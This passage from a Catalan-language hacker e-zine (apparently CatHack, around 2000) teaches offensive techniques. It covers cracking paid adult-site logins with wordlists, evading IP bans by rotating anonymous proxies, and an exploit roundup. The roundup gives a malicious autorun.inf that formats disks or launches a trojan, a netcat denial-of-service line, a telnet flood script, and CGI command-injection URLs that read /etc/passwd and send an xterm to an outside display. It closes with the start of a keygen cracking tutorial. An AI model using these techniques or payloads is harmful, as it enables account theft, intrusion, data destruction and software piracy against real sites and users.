 màxim de text que puguis d'aquest lloc en concret i ho graves en un txt.
 Llavors agafes un programa manipulador de wordlists. Alguns dels programes
 que he esmentat abans (els més complicats) ja ho porten incorporat, però no
 són aplicacions suficientment bones. A http://www.deny.de o a
 http://wordlists.cjb.net/ es poden trobar bons programes manipuladors de
 wordlists. Amb el text d'abans no s'ha de fer més que introduir-lo en un
 programa manipulador (Wordlist Creator o Wordlist Generator) i crearà una
 possible wordlist a partir del text, que probablement anirà bastant bé per
 la web original d'on s'hagi extret el text. Una altra bona manera de
 construir wordlists, i que és la que jo faig, és anar  a llocs on s'ofere
 ixin passwords gratis a la xarxa (com ara http://www.passwordsthatwork.com)
 i agafar els l/p que ofereixen. La majoria ja no estàn disponibles, no són
 actuals o tenen algún problema amb la site amb què s'ofereixen. Moltes
 vegades són els responsables de les mateixes sites XXX que creen aquestes
 webs amb passwords temporals de 2 o 3 dies, perquè la gent pugui visitar-les
 i si els agrada, quan s'acabi el temp de validesa del passwd, que es
 registrin pagant de veritat i els ha agradat. Això si, tots els l/p d'allà
 són o han sigut vàlids en algun moment, per la qual cosa són bons per formar
 part de la teva Wordlist.

Amb tot el que he dit fins ara se n'ha de tenir el mínim com per tenir una
 wordlist suficientment exitosa. La wordlist no serà la millor, però
 probablement servirà. Amb la meva experiència puc dir que hi ha algunes
 normes bàsiques en les wordlists:

        - La majoria de vegades només hi ha lletres minúscules ens els l/p.
          Seguidament hi ha números com a caràcter més comú; i per últim les
          lletres majúscules.
        - Almenys fins avui, una llista que inclogui noms de persones acostuma
          a donar resultats positius.
        - Molt poques XXX sites deixen posar caràcters especials a les l/p
          (ex: !@#$%^&*)

Per començar amb una wordlist, s'ha de pensar que pots provar qualsevol
cosa..... la pitjor cosa que pot passar és que s'obtindrà un resultat negatiu
i s'haurà de tornar a provar amb quelcom diferent.

Un bon inici és, com ja s'ha dit, una llista de noms propis. Si se'n pot
aconseguir una, segur que es va per bon camí. La meva primera llista era una
molt gran amb noms i més noms, tant masculins com femenins, en les màximes
llengües millor. Vaig passar un temps per borrar els noms arcaics que hi vaig
trobar. Funcionava prou bé per ser una wordlist inicial.

Després d'aquest començament, es pot provar d'afegir paraules que puguem
pensar; és més fàcil si les pensem en grups. Un bon exemple és pensar en una
pel.lícula famosa d'èxit mundial, com ara Star Wars, i començar a pensar
possibles l/p:

star     wars
starwars starwars
luke     skywalker
darth    vader
luke     darth
han      solo
chew     bacca
storm    troopers
tie      fighter
death    star

S'agafa una idea general de com s'ha de fer, oi? Bé doncs, ja podem començar
a pensar en temes possibles. N'hi ha molts: planetes, mesos, dies, flors,
gossos, altres animals, música, TV, celebritats, presidents, actors/actrius,
cantants, grups de música, esports, etc.

7. Problemes amb les Wordlists

Si has provat vàries vegades una XXX site i no has aconseguit res, para't a
pensar:

        - Has mirat la manera de registre de la site en qüestió (la "Joining
          Page")? Hi ha webs d'aquestes que tenen condicions especials
          d'entrada, com ara que el login ha de ser de més de 7 o 8 lletres
          (en aquests casos, no serveix usar paraules com "cat, dog, fuck,
          ..."). A la Joining Page també acostuma a sortir quin tipus de
          protecció tenen. Tota la meva explicació només serveix per les
          sites que basen la seva protecció en un javascript sobre un
          document html que consulta un arxiu txt que tenen al seu servidor
          amb els l/p vàlids, basant-se en un ordre de nivells (acostuma a
          ser: 200 = OK, 403=Forbidden Access, 404=Page not found, 400=Bad
          request, 500=Can't fulfill request). Si trobeu altres sistemes,
          probablement no seràn crackejables mitjançant aquest sistema. Però
          no us preocupeu, la gran majoria de les sites estàn protegides amb
          aquest sistema.

        - Si una pàgina us la demanen bastant sovint, serà que és més aviat
          difícil de crackejar, i que la majoria de llistes amb noms o coses
          comuns ja hi hauràn passat sense èxit. És aquí on pot funcionar la
          teva llista pròpia, i on la teva reputació com a cracker pujarà.

        - Hi ha XXX sites que no et demanen que creis un l/p fins que no has
          entrat dins i no han comprovat que la teva targeta de crèdit
          funciona. Aquestes acostumen a ser les més difícils de crackejar,
          ja que demanen que fiquis l/p's molt llargues amb números combinats.

          Més val deixar aquestes sites perquè només seràn crackejables si
          algú les hackeja.

8. Els Accounts

Generalment, segons la meva experiència, els accounts diana que es crackegen
són els d'aquella gent que no són massa brillants. Considerem una persona que
es diu Joanet Tonto. En Joanet navega i troba una XXX site per adults, amb la
seva targeta de crèdit a la mà, apretant-la fort pel nerviosisme. Veu una
noia que li agrada i que voldria "conèixer millor", clicka al botó de "Join",
i comença a omplir els requisits de la sol.licitud de registre de la site. Es
desenvolupa mínimament bé davant les preguntes respecte el seu nom o adreça,
etc. i arriba a la zona on ha d'escriure el seu User ID (login) i Password.
En Joanet no havia pensat fins ara que hauria de passar per aquest tràngol.
Comença a mirar al seu voltant tot estressat. Veu el seu Ordinador de Beep
Informàtica amb el seu sistema operatiu Win95 i el seu Internet Explorer, al
costat de la seva Impresora HP Làser. Gira el cap i observa alguns dels seus
CD's de Pink Floyd o Metallica al costat de la seva minicadena. Llavors mira
cap a la tele i copsa la seva col.lecció de videos de L'Escurçó Negre o
d'Star Trek, ben a prop del seu poster de la Pamela Anderson o el del Ferrari
F-40. Però en aquest moment, se sent molt confús sobre què ha de triar i
escolta la veu de la seva "noia", la de la pàgina que li ha agradat, cridant
el seu nom, i decideix posar com a login l'única cosa que sap segur que se'n
recordarà: Joanet, i només per fer-ho més fàcil de recordar, també posa el
mateix com a password.

Pot semblar Tonta la història que acabo de relatar, però passa cents de
vegades al dia a tot el món, i farà la vostra vida com a XXX Crackers molt
més fàcil. I encara n'hi ha més. Com a norma general, en Joanet s'acabarà
cansant de la bellesa d'aquella noia, i navegarà cap a una altra site
(normalment una site de temes similars a la primera) i tornarà a fer el
mateix procés una altra vegada, i fins que no hagi establert en la seva ment
que aquell l/p no és prou segur, continuarà fent igual.

En aquest punt convé parar-nos una mica. Hi ha diferents sistemes d'assignació
de l/p per als accounts dels nous usuaris. El més corrent són:
Definits-per-l'Usuari, Assignats-per-la-Site o Sistema de Verificació d'edat
Adulta (AVS o Adult Verification Systems).

Els passwords Definits-per-l'Usuari són la nostra diana. Són els que deixen
que l'usuari estableixi tant el login com el password d'accés. Per crackejar
aquestes sites, haureu d'anar a la exacta URL per a Membres. Això es fa
clickant a la zona de Membres i quan surti la típica finestreta demanant el
l/p, es clicka al botó de cancelar, i et dirigirà directament la URL que
necessites amb la informació de l/p no vàlid. Si la site es una amb passwords
Assignats-per-la-Site, millor no perdis temps i esforç en intentar
crackejar-la. La majoria d'elles tenen sistemes de seguretat bons amb l/p
llargs i indesxifrables. A vegades tenen l/p's de prova, però no és el més
normal. Millor proves una altra site. Els Sistemes de Verificació d'edat
Adulta no s'explicaràn aquí. Són sistemes com ara: AdultCheck, PornoPass,
AgeCheck, and AdultKey. Hi ha maneres de crackejar-los, però no amb aquest
programes en general.

En resum, fagis el que fagis, intenta generalment anar a la Joining Page
d'una site abans de provar la teva wordlist sobre ella. T'estalviaràs molts
possibles problemes i maldecaps.

9. Seguretat - Proxies

Tornem al tema que començava al Punt 4: "quan conectes amb aquests programes
directament a la URL protegida, queda registrada la teva IP i et poden
denunciar". Això, com ja deveu saber, passa amb qualsevol programa que usi
internet per desenvolupar-se, des de navegadors, programes de correu fins al
telnet. Què fer doncs, perquè la meva connexió remota al servidor de la XXX
site no deixi constància de la meva IP real? Molt fàcil, connectar a través
d'un Proxy Anònim.

Normalment, la connexió és d'aquest tipus:
El teu ordinador >>> Web Site
La site pot saber la teva IP.

El Proxy actua de la següent forma:
El teu ordinador >>> Proxy >>> Web Site
La site només pot saber la IP del Proxy.

D'aquesta manera navegar i crackejar esdevindrà sens dubte més segur per tu.
Si aconsegueixes un Proxy suficientment ràpid pels teus propòsits (s'ha de
recordar que el fet de conectar a través d'un proxy enlenteix la connexió) i
que sigui totalment anònim (que no loguegi la teva IP), podràs començar a
crackejar.

9a) Però.... Què és exactament un Proxy?

Un Proxy Server és un Servidor amb Firewall i Cache. Serveix perquè una xarxa
sencera d'ordinadors tingui accés a internet (http o ftp) amb una única IP
Diguem que tenim 3 ordinadors en una petita xarxa de Malàisia a través d'un
Proxy Server:

1 -> 2 -> 3 -> PROXY SERVER -> LA WEB SITE

Ara assumim que som a casa nostra amb el nostre accés a Internet a través del
nostre proveïdor, i que la nostra connexió seria la següent:

El teu PC -> El teu ISP (Proveïdor) -> LA WEB SITE

Va bé, doncs..... si el Proxy Server de la Xarxa esmentada a dalt deixa que
altres usuaris accedeixin a través d'ella a internet, pot ser com això:

1 -> 2 -> 3 -> PROXY SERVER -> LA WEB SITE
                 |
                 |
El teu PC -> El teu ISP (Proveïdor)

Com es pot veure en el Diagrama de dalt, podem circular a través del proxy
server i amagar la nostra IP real. "LA WEB SITE" només podrà veure les IP's
 dels proxies de la xarxa a través de la qual estarem connectant.

9b) Perquè s'ha d'usar un Proxy?

Això ja s'ha mencionat abans: per amagar la teva IP REAL. Però, què passa si
el Proxy no és totalment anònim? A vegades passa que el proxy si que deixa
passar la teva IP real a la site que estàs connectant. Hi ha maneres de
verificar si els proxys que uses o que has trobat són realment anònims i
pàgines específicament creades per això: els "ENV Checkers". Aquí dono tres
llocs on es pot comprovar l'anonimitat del proxy que estiguis usant:

http://www.all-nettools.com/ (Abans es denominava Tamos, ara és TamosSoft. El
millor lloc de verificació)

http://kyticr.kuicr.kyoto-u.ac.jp/cgi-bin/phf?Qalias=x%0a/bin/cat%20/etc/passwd

http://proxys4all.cgi.net/env-checkers.shtml

Si veus la teva IP en qualsevol d'aquestes URL's és que el proxy que estàs
usant és una merda i n'hauràs d'usar un altre.

9c) Com trobar un Proxy?

Això ja no és tan fàcil, és similar al tema de les Wordlists. Ningú et
passarà els proxies que utilitza perquè els ha costat trobar-los i perquè
n'hi ha que restringeixen l'accés a un màxim número de connexions, de manera
que com més gent sàpiga el proxy, menys possibilitats d'accedir-hi hi haurà.
Però com amb tot, sempre hi ha maneres d'aconseguir les coses. Primer de tot
aquí dono una sèrie de llocs on es poden trobar llistes de possibles proxys.
La majoria probablement ja no serivràn, però sempre van bé per
familiaritzar-se amb els processos de búsqueda de proxies i de la seva
anonimitat.

http://www.lightspeed.de/irc4all/eproxy.htm
http://www.bikkel.com/~proxy/links4all.html  
http://cavency.virtualave.net/proxy/
http://proxys4all.cgi.net/

Altres maneres de buscar possibles proxies (ordenades de més fàcil a més
difícil):

        - Visitar un fòrum relacionat amb hacking/cracking/warez/phreaking i
          mirar les IP's de la gent que hi ha escrit explicant quelcom
          interessant (a vegades són IP's spoofejades, però també trobes
          proxies bons).

        - Scanejar dominis per possibles ports oberts 8080 o 3128. Qualsevol
          scanner típic funciona.

        - Fer pings als hosts pels ports 8080 o 3128 (alguns scanners
          funcionen així).

10. Fakes i Redireccionaments

Les XXX sites més visitades acostumen a ser les que estan més ben protegides.
La manera que tenen de protegir els seus l/p vàlids és banejant o denegant
l'accés a una IP que hagi fet més de "X" intents (normalment 50) durant un
període curt de temps determinat. Quan el servidor que estàs intentant
crackejar de sobte et comença a donar errors estranys en cada l/p que proves,
o et comença a dir que cada l/p que proves és vàlida, és que té aquest sistema
de detecció/protecció. S'acostuma a dir que la site en qüestió dóna "Fakes" o
Redireccionaments.

La manera de saltar-se aquest sistema és ben fàcil, però no es pot fer amb
programes senzills de cracking (com ara el HackerTTP), així que us recomano
que no intenteu obtenir l/p's d'aquestes sites fins que no tingueu una mica
d'experiència. Els programes més "complicats" tenen opcions per saltar-se
aquestes deteccions. Com es fa? doncs tenint una llista de proxies anònims i
viables suficientment llarga com per anar canviant cada 49 intents de proxy
fins que troba el l/p. Normalment amb 30 o 40 proxies és suficient, ja que en
finalitzar, torna a començar des del principi, però com ja fa estona que la
IP inicial s'ha usat, no ho detectarà. Que el número d'intents a partir del
qual el servidor baneja les IP's és menor de 49?, doncs es baixa el número
d'intents que el programa ha de fer amb cada proxy i llestos. Si, d'aquesta
manera serà més lent, però si vols aconseguir un l/p d'aquella site, acabaràs
fent-ho.

11. Consideracions finals

Bé doncs, jo crec que ja us he explicat tot el que cal saber per ser un bon
XXX Cracker. A partir d'ara només em queda dir-vos que us assegureu SEMPRE
que els vostres proxies siguin anònims i que no deixeu mai de millorar les
vostres wordlists si voleu tenir èxit. Ja podeu obrir el programa, pujar la
wordlist al programa, dir-li quin proxy voleu que fagi servir i començar a
crackejar.

BONA SORT!

**********************
*** Firmat: }||||{ ***
**********************


SkSkSkSkSkSkSkSkSkSkSkSkSkSkSkSkSkSkSkSkSkSkSkSkSkSkSkSkSkSkSkSkSkSkSkSkSkSkSk
Oi!Oi!Oi!Oi!Oi!Oi!Oi!Oi!Oi!Oi!Oi!Oi!Oi!Oi!Oi!Oi!Oi!Oi!Oi!Oi!Oi!Oi!Oi!Oi!Oi!Oi!
SkSkSkSkSkSkSkSkSkSkSkSkSkSkSkSkSkSkSkSkSkSkSkSkSkSkSkSkSkSkSkSkSkSkSkSkSkSkSk
Oi!Oi!Oi!Oi!Oi!Oi!Oi!Oi!Oi!Oi!Oi!Oi!Oi!Oi!Oi!Oi!Oi!Oi!Oi!Oi!Oi!Oi!Oi!Oi!Oi!Oi!
SkSkSkSkSkSkSkSkSkSkSkSkSkSkSkSkSkSkSkSkSkSkSkSkSkSkSkSkSkSkSkSkSkSkSkSkSkSkSk


$04$

BBBBBB  BBB  BBB  BBBBBB   BBBBBB           AAAA   AAA   AAA AAAAAA
BBB  BB BBB  BBB BBB      BBB              AAAAAA  AAAA  AAA AAA  AA
BBBBBB  BBB  BBB BBB BBBB  BBBBB          AAA  AAA AAA A AAA AAA  AAA
BBB  BB BBB  BBB BBB  BBB     BBB         AAAAAAAA AAA  AAAA AAA  AA
BBBBBB   BBBBBB   BBBBBB  BBBBBB          AAA  AAA AAA   AAA AAAAAA

EEEEEEE EEE   EEE EEEEEE  EEE     EEEEE   EEE EEEEEEE  EEEEEE
EEE      EEE EEE  EEE  EE EEE    EEEEEEE  EEE EEEEEEE EEE
EEEEE     EEEEE   EEEEEE  EEE   EEE   EEE EEE   EEE    EEEEE
EEE      EEE EEE  EEE     EEE    EEEEEEE  EEE   EEE       EEE
EEEEEEE EEE   EEE EEE     EEEEEE  EEEEE   EEE   EEE   EEEEEE


1.- Buffer Overflow en WebBBS HTTP Server per NT4.
2.- Panda Server HACK (barner)
3.- Autorun exploit (acastan)
4.- Win2k DoS (barner)
5.- X-Cript bug (josepmir)
6.- Shutdown: Root local amb Linux (KL4RK)
7.- Whois.cgi : PHF torna!!
8.- Execució remota en Xchat (HispaSec)
9.- Buffer Overflow en IE i NS


v--[Buffer OverFlow en WebBBS HTTP Server per NT4]----------------------------

Victima: WebBBS HTTP Server 1.15 per wNT4

Explicació del fallo:
Aquest dimoni per NT4 pateix un Buffer Overflow quan se li envia un fitxer de
227+EIP o 545+EIP bytes - Aixo permetria sobreescriure la EIP de retornada i
per tant poder executar la comanda que volguem remotament.

Solució: Modificar la configuració per defecte del WebBBS

Descobert per: http://www.delphisplc.com/thinking/whitepapers/

^--[Buffer OverFlow en WebBBS HTTP Server per NT4]----------------------------



v--[Panda Server HACK ]-------------------------------------------------------

Explicació: Es veu k el Panda obra una consola al port 2001 en xarxes NetWare,
  la qual ens permet executar qualsevol comanda. Per cargar el server cal fer:
  "NC SERVER 2001", on disposem de les següentes ordres:

> ANALYZE             CMD                 HELP                LOAD
> RELOADCFG           UPDATE              UNLOAD              VER

Solució: Diuen k ja ho han arreglat en la GVI disk.(labeled M6/A00)

^--[Panda Server HACK ]-------------------------------------------------------



v--[Autorun exploit ]---------------------------------------------------------

                             EL RACO DE L'EXPLOIT

                           per Alex Castan Salinas
                              alex.castan@upc.es

                            *--------------------*
                            |                    |
                            |  El teu ordinador  |
                            |      es mort...    |
                            | i abans estava viu |
                            |     _______        |
                            |    |.-----.|       |
                            |    ||x . x||       |
                            |    ||_.-._||       |
                            |    `--)-(--'       |
                            |   __[=== o]___     |
                            |  |:::::::::::|\    |
                            |  `-=========-'()   |
                            |                    |
                            | No hauries d'haver |
                            |    instal.lat :    |
                            |                    |
                            |  -= Windows'95 =-  |
                            *--------------------*
 


Vulnerabilitat : autorun

Afecta a : Windows 95, 98, 2000 i NT 4


Be, a les seguents linies explico un petit truc o vulnerabilitat que permet
que un usuari executi sense adonar-se'n un programa nostre.



INTRODUCCIO
-----------
Molts usuaris de Windows haureu pogut comprovar que en inserir un cdrom al
vostre ordinador o en fer doble clic sobre la icona del cd, s'executa
automaticament algun programa que ve amb el cdrom. Aixo es degut a que al
directori arrel del cdrom que heu inserit existeix un petit arxiu anomenat
autorun.inf que indica quina icona substituira a la icona habitual de la
unitat i quin programa s'executara automaticament en inserir el cdrom o fer
doble clic sobre la seva icona.

Per exemple: introdueixo a la meva maquina un cdrom que tinc al meu abast i
visualitzo el contingut del fitxer autorun.inf.

+--------------------------------+
| [autorun]                      |
| open = notepad.exe AlexCD3.txt |
| icon = AlexCD3.ico             |
+--------------------------------+

La linia "open" indica que s'executara el programa notepad.exe (bloc de notes)
obrint el fitxer de text AlexCD3.txt, que es contingut al directori arrel del
cdrom.
La linia "icon" indica que la icona de la unitat de cd sera substituida
per la icona continguda al fitxer AlexCD3.ico, tambe contingut al directori
arrel del cdrom.



VULNERABILITAT
--------------
I que passa amb l'autorun? Doncs passa que aquesta caracteristica de Windows
no esta limitada a la unitat de cd, sino que es pot emprar a qualsevol unitat
de disc: disquet, discs durs, discs de xarxa, discs virtuals a memoria RAM,
zip, jazz, etc. Qualsevol d'ells pot tenir un fitxer autorun.inf al seu
directori arrel, indicant la nova icona i el programa a executar.

A les maquines amb Windows 95, 98 i NT 4, existeixen tres valors al registre
que controlen la manera en que el fitxer autorun.inf s'executa:

1) Un valor que controla si es produeix una notificacio d'autoinsercio quan
   s'introdueix un disc a una unitat de discs removible (cdrom, disquet, zip,
   etc.).

   Win9x
   -----
   Clau  : HKEY_LOCAL_MACHINE\Enum\SCSI\Nom_de_la_unitat\MF&...\
   Nom   : AutoInsertNotification
   Valor : binari 01 (per defecte habilitat, per inhabilitar canviar a 00).

   WinNT
   -----
   Clau  : HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Cdrom\
   Nom   : Autorun
   Valor : hexadecimal 0x00000001 (per defecte habilitat, per inhabilitar
           canviar a 0x00000000).

2) Un valor que controla sobre quin tipus d'unitats de disc no s'ha d'executar
   el fitxer autorun.inf. El primer byte d'aquest valor es una mascara de
   bits, on un 0 indica que es pot executar l'autorun.inf a un determinat
   tipus d'unitat de disc i un 1 indica que no es pot executar.

         Tipus unitat de disc          Bit          Valor per defecte
         --------------------          ---          -----------------
         Tipus de disc desconegut       0                   1
         Disc sense directori arrel     1                   0
         Disc removible                 2                   1
         Disc fix                       3                   0
         Disc de xarxa                  4                   1
         Disc cdrom                     5                   0
         Disc RAM                       6                   0
         Tipus de disc indefinit        7                   1

   Com podeu comprovar, l'autorun esta per defecte habilitat per discos sense
   directori arrel, discos durs, cdrom i discos RAM.

   Win9x
   -----
   Clau  : HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer
   Nom   : NoDriveTypeAutorun
   Valor : binari 95 00 00 00 (per defecte habilitat per discs durs, per
           inhabilitar canviar a 9d 00 00 00).*

   WinNT
   -----
   Clau  : HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer
   Nom   : NoDriveTypeAutorun
   Valor : hexadecimal 0x00000095 (per defecte habilitat per discs durs, per inhabilitar canviar a 0x0000009d).*

   * valor binari 10010101 = valor hexadecimal 95
   * valor binari 10011101 = valor hexadecimal 9d

3) Un valor que controla sobre quina lletra d'unitat de disc no s'ha
   d'executar el fitxer autorun.inf. Cada bit d'aquest valor representa la
   lletra d'una unitat, on el bit de la posicio zero (dreta) es la A:, el
   seguent la B:, i aixi successivament. Un bit a 1 indica no executar
   l'autorun, i un bit a 0 si. Per exemple: el valor hexadecimal 0x00000005
   (que equival a 101 en binari) inhabilita l'autorun a les unitats A: i C: .

   Win9x
   -----
   Clau  : HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer
   Nom   : NoDriveAutorun
   Valor : Cap (per defecte habilitat per totes les unitats).

   WinNT
   -----
   Clau  : HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer
   Nom   : NoDriveAutorun
   Valor : Cap (per defecte habilitat per totes les unitats).



COM EXPLOTAR LA VULNERABILITAT
------------------------------
Podem crear fitxers autorun.inf al directori arrel d'unitats de disc que tenen
habilitat l'autorun (per defecte o per nosaltres), per tal que inesperadament
s'executi algun programa en fer l'usuari doble clic  sobre la icona de la
unitat de disc. Algunes idees:

1. Formatejar el disc dur.

   +--------------------------------+
   | [autorun]                      |
   | open = format ...              |
   +--------------------------------+

2. Apagar Windows.

   +----------------------------------------+
   | [autorun]                              |
   | open = rundll user.exe,exitwindowsexec |
   +----------------------------------------+

3. Reiniciar Windows.

   +------------------------------------+
   | [autorun]                          |
   | open = rundll user.exe,exitwindows |
   +------------------------------------+

4. Instal.lar un troia o un virus.

   +------------------+
   | [autorun]        |
   | open = troia.exe |
   +------------------+

5. En Windows NT l'executable pot ser un fitxer que detecti els privilegis de
   l'usuari. Si l'usuari no te privilegis administratius, llavors invoca
   l'explorador de Windows, visualitzant el directori de la unitat amb
   normalitat. Si l'usuari si te privilegis administratius, llavors invoca
   qualsevol troia i posteriorment invoca l'explorador de Windows,
   visualitzant el directori de la unitat com si res no hagues passat.

En alguns casos ens interessara crear el fitxer autorun.inf en el directori
arrel d'una unitat fixa (disc dur) d'una maquina a la que no tenim acces
fisic. Feu servir llavors la vostra imaginacio: trobar un disc compartit per
aquesta maquina amb permisos per escriure, aprofitar alguna vulnerabilitat a
l'Internet Information Server que permeti pujar un fitxer al directori arrel,
etc.



EL PEGAT
--------
Tal com heu vist, canvieu la claus del registre per tal d'inhabilitar la
notificacio d'autoinsercio i d'inhabilitar l'autorun a discs durs i d'altres
unitats. 

^--[Autorun exploit ]---------------------------------------------------------

v--[ Win2k DoS attack ]-------------------------------------------------------

Victimes:
                 Microsoft Windows NT 2000.2072
                    + Microsoft Windows NT 2000
                 Microsoft Windows NT 2000.2031
                    + Microsoft Windows NT 2000
                 Microsoft Windows NT 2000.0.2195
                 Microsoft Windows NT 2000

Explicació:

El dimoni telnet de win2k pot arribar a penjar la màquina si rep una conexió
per telnet enviant-li una sèrie de 0 binaris, la màquina es penjara a no ser
que tingui configurat el servei automatic de reboot.


Explotació:

Empran netcat sota Linux:
 nc target.host 23 < /dev/zero


Pegat:
 No n'hi ha cap encara... cal treure el servei.

^--[ Win2k DoS attack ]-------------------------------------------------------


v--[ Bug al Xcript ]----------------------------------------------------------


Hola! Booon dia!! :)

El què explicaré avui és una cosa que he deduït jo pel meu compte,
assegurant-me així que no ho hagueu llegit prèviament.

El nivell no és alt ni molt tècnic, però...amb el temps ja aniré aportant
articles de més qualitat (el que es diu sempre vaja..xD)

Bug al X-Cript (un script pel mIRC)
-----------------------------------

[Atac:]
Segons sembla, en aquest script hi ha l'opció de posar un programa a l'escolta
del port 12345 (Netbus com tots sabreu), per tal de poguer informar a l'usuari
en cas d'una entrada. Doncs bé, l'atac és ben senzill, es tracta de realitzar
moltes connexions per tal de que l'x-cript, al ser entrat, envia tanta dada al
servidor irc (segurament per esbrinar el nick del tiu q l'està entrant amb el
NetBus) que l'usuari cau degut a Excess flood i mentres l'atac dura el mirc es
semi-penja.

No sé si m'he explicat molt bé, però si no és així...doncs...us ho torneu a
llegir..xD

No sé a què és degut però el fet és que la víctima només cau un cop, vull dir,
que si després d'un atac realitzeu el mateix un altre cop, pos no caurà...i no
en tinc ni idea del pq. Ja haureu constatat que no he provat mai l'x-cript i
per tant no he pogut esbrinar l'exacte raó de tot això. Si algú vol
puntualitzar, doncs que escrigui en un pròxim número! :)

Per acabar, explicar la manera com jo faig l'atac. També és molt senzilla i
xapussera, es tracta de (des del linux) escriure això...
# telnet ip_o_host_de_la_víctima 12345 & telnet ip_o_host_de_la_víctima 12345 &
 telnet ip_o_host_de_la_víctima 12345 & telnet ip_o_host_de_la_víctima 12345 &
telnet ip_o_host_de_la_víctima 12345 & telnet ip_o_host_de_la_víctima 12345 &
telnet ip_o_host_de_la_víctima 12345 & telnet ip_o_host_de_la_víctima 12345 &
telnet ip_o_host_de_la_víctima 12345 & telnet ip_o_host_de_la_víctima 12345 &
telnet ip_o_host_de_la_víctima 12345 &  telnet ip_o_host_de_la_víctima 12345

/*
nota de cathack:

potser és més util escriure en un fitxer aixo:

--8<---cuthere--

#!/bin/sh
#
# Atac al xcript
#

if ( $1 == NULL )
   {
    echo Atac a l'Xcript al port 12345 (per defecte)
    echo S'empra: " $0 ip/dns "
    exit
   }

echo Atacant a l'xscript de la màquina $1 al port (per defecte) 12345.

while :
 do
  telnet $1 12345 &
 done

-->8---cuthere--
*/

Escrius això de "telnet ip_o_host_de_la_víctima 12345 &" tants cops com
vulguis (això si, al final de tot, al últim telnet, no hi posis "&"). I vas
repetint el comando fins que vegis que el tiu ha caigut del irc. Al resultat
del comanda hi haurà molta merda (Connection refused..) però...tu passa molt i
continua fent-ho. xD

També us podeu currar un shell script, però jo no en tinc massa idea.

Això és tot, si teniu algun dubte o algo, josepmir@teleline.es
I recordeu, Visca Catalunya!

^--[ Bug al Xcript ]----------------------------------------------------------



v--[ Shutdown: root local ]---------------------------------------------------


Victima: Linux Rh6.2 (d'altres tb??)
Programa afectat: Shutdown


He descobert un bug molt divertit a la web de bugs de redhat
(bugzilla.redhat.com/bugzilla):

si un usuari qualsevol fa

$ shutdown now
password:    <--- aqui hi posa el seu password mateix d'usuari

La maquina passa a mode de manteniment, i (nomes si tens access fisic a la
maquina) cau UNA SHELL ROOT. Provat en el meu RH6.2, i segurament rula en
moltes (totes?) les versions anteriors....


^--[ Shutdown: root local ]---------------------------------------------------




v--[ Whois.cgi / whois_raw.cgi ]----------------------------------------------

Sistema afectat: Qualsevol basat en únix amb akesta CGI
Com trobar-lo?: probeu amb el cgi-scan
Informa: Pop.tPH
Solució: Borrar el fitxer.


Algu s'enrecorda del bug PHF (els qui portin més temps en aixo del hacking
ja ho sabran, doncs bé es tractava d'una cgi que estava mal escrita i que
ens permitia executar qualsevol comanda remotament (suposo que el nivell
d'usuari era el del dimoni httpd), doncs bé, aquest fallo (actualment només
afecta al 0.1% de les màquines), pero ara ha aparegut una altre CGI mal
escrita amb les mateixes caracteristiques que el PHF.

Aquesta CGI porta el nom de "whois_raw.cgi".
Haurem de demanar al servidor el fitxer whois_raw.cgi amb les
opcions següents (? - es per dir que cal enviar una comanda PUT enlloc de
GET)

fqdn=%0A - > per despistar a la cgi i fer un return (0x0A)
cat%20/etc/passwd -> %20 equival a un caracter d'espai.


Alguns exemples d'us son aquests: aixo s'escriu desde el navegador
canviant el www.victim.com per la url victima.


http://www.victim.com/cgi-bin/whois_raw.cgi?fqdn=%0Acat%20/etc/passwd
      
http://www.victim.com/cgi-bin/whois_raw.cgi?fqdn=%0A/usr/X11R6/bin/xterm%20-display%20graziella.lame.org:0


^--[ Whois.cgi / whois_raw.cgi ]----------------------------------------------



v--[ Execució remota en Xchat ]-----------------------------------------------

Informa: HispaSec
Fallo en: v1.3.9 (i posteriors)
Patch: Actualizar a: http://www.xchat.org/

El fallo està en que al obrir una url ho fa a través de la shell i no del
navegador, i per tant possant una barra vertical | i les ordres a executar
a continuació (si la victima obra aquella url fent click) s'executarien les
ordres al nivell d'usuari que estigui en aquell moment utilitzant l'xchat.

^--[ Execució remota en Xchat ]-----------------------------------------------

v---[ Buffer Overflow en IE i NS ]--------------------------------

Ens trobem davant d'un altre cas tipic de buffer overflow.

Akest cop amb l'html...interessant eh!. ens informa
la llista d'HispaSec.

El fallo consisteix en escriure el següent codi en una
pàgina HTML:

<FORM action=sorpresa method=post>
<INPUT type=password value=16kb_de_longitud>
</FORM>

on 16k_de_longitud son caracters seguits fins a sumar
17kb, uns 17000 caracters. Aixo provoca la penjamenta
del client.

^---[ Buffer Overflow en IE i NS ]--------------------------------


==============================================================================
&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
==============================================================================
$05$

 ________________________________________________
|                                                |
| Seccio: Cracking                               |
|                                                |
| Tema  : Com fer un Generador de codis (KeyGen) |
.________________________________________________'
			QUiCKSHOT  -  CatHack'2000

Crack:
------
* Programa:  Start Cleaner v1.2
* Tipus de crack:
	|
	'- Key Gen (1)
	|
	'- Patch   (2)

Eines basiques:
--------------
-Debugger (jo utilitzo el SoftIce v3.24 per win95, va de conya!)
-Desensamblador (el w32Dasm va be)

Altres:
------
-Qbasic (ja ve amb el windows) per fer el KeyGen o qualsevol altre llenguatge.
 Amb el Basic es veu molt clar.
-Informacio de les crides de Windows per saber ke fan (el win32.hlp les 
 explica totes, podeu trobar-lo fent un fastFTP, son 11Mb)


Intro
------
  Despres d'estudiar ASM i interpretar molt m'he decidit per fer un article sobre 
com fer un generador de codis d'un programa. L'article parlara tambe una mica de
l'ASM per win32 i d'algunes de les funcions mes utilitzades. Mes ke ensenyar kè he
fet, intentare explicar COM i PERQUE he fet les coses d'una manera concreta.
	Akest programa es una utilitat ke serveix per eliminar els accessos
directes ke no apunten enlloc o les carpetes buides ke tenim al Menu Inici a Win95.
	En executar el Start Cleaner se'ns mostra directament una pantalla ke ens 
